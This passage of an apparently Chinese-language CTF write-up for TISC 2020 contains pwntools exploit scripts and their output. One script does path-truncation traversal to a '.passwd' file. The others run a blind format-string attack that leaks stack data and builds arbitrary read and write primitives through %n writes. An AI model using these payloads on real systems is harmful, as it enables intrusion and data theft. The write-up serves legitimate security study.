    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">12123</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"USERNAME: \33[0m"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"PASSWORD: \33[0m"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0011ff2244ffbbaaaa22hhcc"</span><span class="token punctuation">)</span>

    <span class="token comment"># Path Truncation Attack</span>
    length <span class="token operator">=</span> <span class="token number">254</span>
    pathing <span class="token operator">=</span> <span class="token string">b'/home/bbs/threads/'</span>
    prefix <span class="token operator">=</span> <span class="token string">b'../'</span>
    back_part <span class="token operator">=</span> <span class="token string">b'/.passwd'</span>
    slashes <span class="token operator">=</span> <span class="token string">b'/'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pathing<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>back_part<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> prefix <span class="token operator">+</span> slashes <span class="token operator">+</span> back_part

    <span class="token comment"># SELECT prompt</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"SELECT: \33[0m"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"V"</span><span class="token punctuation">)</span>

    <span class="token comment"># Send the path</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"THREAD: \33[0m"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    <span class="token comment"># Get the flag.</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x1b[H'</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Flag: %s"</span> <span class="token operator">%</span> flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<pre class="language-shell" data-language="shell"><code class="language-shell">$ python exploit.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port <span class="token number">12123</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Flag: TISC20<span class="token punctuation">&#123;</span>m4ngl3d_b4ngl3d_wr4ngl3d<span class="token punctuation">&#125;</span></code></pre>

<p><strong>Flag:</strong> <code>TISC20&#123;m4ngl3d_b4ngl3d_wr4ngl3d&#125;</code></p>
<h2 id="STAGE-6-Blind-Boss-Battle"><a href="#STAGE-6-Blind-Boss-Battle" class="headerlink" title="STAGE 6: Blind Boss Battle"></a>STAGE 6: Blind Boss Battle</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600938050247-s6a-0.jpg" srcset="/img/loading.gif"></p>
<p>连接服务器，可以发现字符串漏洞：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">nc</span> fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg <span class="token number">42000</span>
Welcome to Anoroc Riga Server

  Key-Value Storage Service

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Number of <span class="token function">users</span> pwned today: <span class="token number">5908</span>
Function Not Yet Implemented

AAAA
AAAA
%p %p %p %p %p %p %p
0x7fe685d08a03 <span class="token punctuation">(</span>nil<span class="token punctuation">)</span> 0x7fe685d08980 0x55f90fc8d0a0 <span class="token punctuation">(</span>nil<span class="token punctuation">)</span> 0x7fff2fc20690 0x55f90fc8a2e0</code></pre>

<p>但当使用以下payload时，并没有发现<code>AAAAABBBBB</code>出现在堆栈泄露中：</p>
<pre class="language-none"><code class="language-none">AAAAABBBBA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
AAAABBBB.0x7f8ea2940a03.(nil).0x7f8ea2940980.0x5647b7e9d0a0.(nil).0x7ffcea9d97d0.0x5647b7e9a2e0.(nil).0x7f8ea277c0b3.0x7f8ea2979620.0x7ffcea9d97d8.0x100000000.0x5647b7e9a100.0x5647b7e9a2e0.0x23f94e9d138646bf.0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0xdc009ba63e6646bf.0xdce40a72934846bf.(nil).(nil).(nil).0x1.0x7ffcea9d97d8.0x7ffcea9d97e8.0x7f8ea297b190.(nil).(nil).0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0x5647b7e9a21e.0x7ffcea9d97c8.0x1c.0x1.0x7ffcea9daf5c.(nil).0x7ffcea9daf61.0x7ffcea9dafa3.</code></pre>

<p>这说明我们控制的缓冲区在堆里或者其他可写的内存中。为了寻找线索，编写脚本获取更多的输出：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">run_leak</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    prefix <span class="token operator">=</span> <span class="token string">b"XXXX"</span>
    total <span class="token operator">=</span> prefix <span class="token operator">+</span> payload
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>total<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token keyword">def</span> <span class="token function">leak_str</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'AAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$s %'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$p'</span> <span class="token operator">+</span> <span class="token string">'CCCC'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    string <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> string

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">42000</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            leaked_string <span class="token operator">=</span> leak_str<span class="token punctuation">(</span>p<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
            first_part <span class="token operator">=</span> leaked_string<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b' 0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
            address_maybe <span class="token operator">=</span> u64<span class="token punctuation">(</span>first_part<span class="token punctuation">)</span>
            status <span class="token operator">=</span> <span class="token string">b"%s 0x%x %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>leaked_string<span class="token punctuation">,</span> address_maybe<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>得到一堆输出：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">b&#39;%0$s %0$p 0x2430252073243025 0&#39;
b&#39;\n 0x7fb9d66f6a03 0xa 1&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 2&#39;
b&#39;\x8b \xad\xfb 0x7fe571c13980 0xfbad208b 3&#39;
b&#39;XXXXAAAA%4$s %4$pCCCC 0x5633c36260a0 0x4141414158585858 4&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 5&#39;
b&#39;\x01 0x7ffe5903f370 0x1 6&#39;
b&#39;\xf3\x0f\x1e\xfaAWL\x8d&#x3D;\xa3* 0x56177ef4f2e0 0x8d4c5741fa1e0ff3 7&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 8&#39;
b&#39;\x89\xc7\xe8\x06+\x02 0x7f11930d60b3 0x22b06e8c789 9&#39;
b&#39; 0x7f896fe78620 0x0 10&#39;
b&#39;\\\xefc\xbc\xfd\x7f 0x7ffdbc63d238 0x7ffdbc63ef5c 11&#39;
b&#39;\xf3\x0f\x1e\xfaU1\xf6H\x8d-\x92&#x2F; 0x5648c11c5100 0x48f63155fa1e0ff3 13&#39;
b&#39;\xf3\x0f\x1e\xfaAWL\x8d&#x3D;\xa3* 0x55d52ec162e0 0x8d4c5741fa1e0ff3 14&#39;
b&#39;\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55b5aed8e1f0 0x8949ed31fa1e0ff3 16&#39;
b&#39;\x01 0x7ffd3f6b8330 0x1 17&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 18&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 19&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 22&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 23&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 24&#39;
b&#39;\\o-\xf3\xfc\x7f 0x7ffcf32d4ef8 0x7ffcf32d6f5c 26&#39;
b&#39;a&#x2F;\x8c8\xfe\x7f 0x7ffe388c13b8 0x7ffe388c2f61 27&#39;
b&#39; 0x7f4448906190 0x0 28&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 29&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 30&#39;
b&#39;\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x5628217c51f0 0x8949ed31fa1e0ff3 31&#39;
b&#39;\x01 0x7ffc902d7a70 0x1 32&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 33&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 34&#39;
b&#39;\xf4\x90H\x8d&#x3D;). 0x560a948af21e 0x2e293d8d4890f4 35&#39;
b&#39;\x1c 0x7fff0fb76318 0x1c 36&#39;
b&#39;pwn6 0x7ffdf4d72f5c 0x366e7770 39&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 40&#39;
b&#39;PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin 0x7ffdd55a4f61 0x73752f3d48544150 41&#39;
b&#39;HOSTNAME&#x3D;70e208321dbb 0x7ffd95f00fa3 0x454d414e54534f48 42&#39;
b&#39;user&#x3D;pwn6 0x7fffabdc8fb9 0x6e77703d72657375 43&#39;
b&#39;HOME&#x3D;&#x2F;home&#x2F;pwn6 0x7ffd44407fc3 0x6f682f3d454d4f48 44&#39;
b&#39;REMOTE_HOST&#x3D;10.0.0.3 0x7ffea9b30fd3 0x485f45544f4d4552 45&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 46&#39;
b&#39;\x7fELF\x02\x01\x01 0x7ffe8beb9000 0x10102464c457f 48&#39;
b&#39;\x06 0x5608a1023040 0x6 56&#39;
b&#39;\x7fELF\x02\x01\x01 0x7f224ba9c000 0x10102464c457f 62&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 64&#39;
b&#39;\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55dec82f61f0 0x8949ed31fa1e0ff3 66&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 76&#39;
b&#39;\xf5I\xa3n&lt;\x86\xd6\x13\xbb\xa9$\xdf6\xd5\x86\xddx86_64 0x7ffe30e7adb9 0x13d6863c6ea349f5 78&#39;
b&#39;(null) (nil) 0x2820296c6c756e28 80&#39;
b&#39;&#x2F;home&#x2F;pwn6&#x2F;pwn6 0x7ffed176ffe8 0x77702f656d6f682f 82&#39;
b&#39;x86_64 0x7ffd8dd10819 0x34365f363878 84&#39;</code></pre>

<p>为了让程序泄露出更多的信息，我们需要一个任意指针并开始泄漏数据。下面的脚本中，<code>run_leak(p, b&#39;%57001c%26$n&#39;)</code>一行，可以将<code>0xdead</code>值写入到堆栈的索引中。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">run_leak</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    prefix <span class="token operator">=</span> <span class="token string">b"XXXX"</span>
    total <span class="token operator">=</span> prefix <span class="token operator">+</span> payload
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>total<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token keyword">def</span> <span class="token function">leak_str</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> windex<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'AAAA'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$p'</span> <span class="token operator">+</span> <span class="token string">'CCCC'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    string <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> string

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">42000</span><span class="token punctuation">)</span>
    baseline <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> <span class="token number">17</span>
    run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">b'%57001c%26$n'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        leaked_string <span class="token operator">=</span> leak_str<span class="token punctuation">(</span>p<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'nil'</span> <span class="token keyword">in</span> leaked_string <span class="token keyword">or</span> <span class="token string">b'$'</span> <span class="token keyword">in</span> leaked_string<span class="token punctuation">:</span>
            pointer <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            pointer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaked_string<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        baseline<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pointer<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>baseline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%-3d 0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> baseline<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>当索引<code>26</code>的地址进行写操作时，索引<code>39</code>的地址被<code>0xdead</code>覆盖最后四位。</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">...
17  0x7ffe079258b0
18  0x0
19  0x0
20  0xf5fe6c5e253d7550
21  0xf45110276a537550
22  0x0
23  0x0
24  0x0
25  0x1
26  0x7ffe079258b8
27  0x7ffe079258c8
28  0x7f29b9cee190
29  0x0
30  0x0
31  0x5634bfab41f0
32  0x7ffe079258b0
33  0x0
34  0x0
35  0x5634bfab421e
36  0x7ffe079258a8
37  0x1c
38  0x1
39  0x7ffe0000dead
...</code></pre>

<p>此时，我们就获得一个原语。由于索引<code>39</code>包含堆栈地址，我们可以对其修改，让其作为跳板将数据写入另一个索引，这样就可以指向堆栈中的任意点，形如<code>stack ptr 1 -&gt; stack ptr 2 -&gt; somewhere in the stack</code>。<br>接下来，需要找寻文件的基址，这里可以使用<code>.bbs</code>中的字符串地址和对应的掩码。ELF头是以<code>ELF</code>开头，经过一系列尝试，掩码为<code>0xffffffffffffe000</code>有很大可能得到正确的地址。完整的脚本如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> pwnlib

<span class="token comment">#context.log_level = 'debug'</span>
context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">run_leak</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    prefix <span class="token operator">=</span> <span class="token string">b"XXXX"</span>
    postfix <span class="token operator">=</span> <span class="token string">b'ZZZZ'</span>
    total <span class="token operator">=</span> prefix <span class="token operator">+</span> payload <span class="token operator">+</span> postfix
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>total<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">adjust_bouncer</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> base<span class="token punctuation">,</span> index<span class="token punctuation">,</span> offset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Adjust the value of index 39 to point at a particular index.</span>
    address <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token punctuation">(</span>index <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset
    lower_address <span class="token operator">=</span> address <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
    payload <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lower_address<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%26$hn'</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_address</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> address

<span class="token keyword">def</span> <span class="token function">leak_data</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> run_leak<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r

<span class="token keyword">def</span> <span class="token function">write_single</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Value must be a 2 bytes short</span>
    <span class="token keyword">if</span> value <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%39$hn'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">b'%39$hn'</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">write_index</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> index<span class="token punctuation">,</span> address<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Writes an arbitrary value to an index.</span>
    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">39</span><span class="token punctuation">:</span>
        <span class="token comment"># NOT ALLOWEEED</span>
        <span class="token keyword">return</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        current_portion <span class="token operator">=</span> <span class="token punctuation">(</span>address <span class="token operator">>></span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
        adjust_bouncer<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> index<span class="token punctuation">,</span> offset<span class="token operator">=</span>i<span class="token punctuation">)</span>
        write_single<span class="token punctuation">(</span>p<span class="token punctuation">,</span> current_portion<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">arbitrary_read</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    write_index<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index_base<span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> address<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> leak_data<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg'</span><span class="token punctuation">,</span> <span class="token number">42000</span><span class="token punctuation">)</span>

    <span class="token comment"># Index 17 points to Index 38</span>
    <span class="token comment"># Figure out address of Index 38</span>
    index_17_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span>
    index_38_address <span class="token operator">=</span> index_17_value
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 38: 0x%x"</span> <span class="token operator">%</span> index_38_address<span class="token punctuation">)</span>

    <span class="token comment"># Figure out index 0</span>
    index_base <span class="token operator">=</span> index_38_address <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">38</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"RSP (index 0): 0x%x"</span> <span class="token operator">%</span> index_base<span class="token punctuation">)</span>

    <span class="token comment"># Figure out the halfed address to index 39</span>
    index_26_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Got address of index 26 (index 39): 0x%x"</span> <span class="token operator">%</span> index_26_value<span class="token punctuation">)</span>

    index_39_value <span class="token operator">=</span> leak_address<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">)</span>
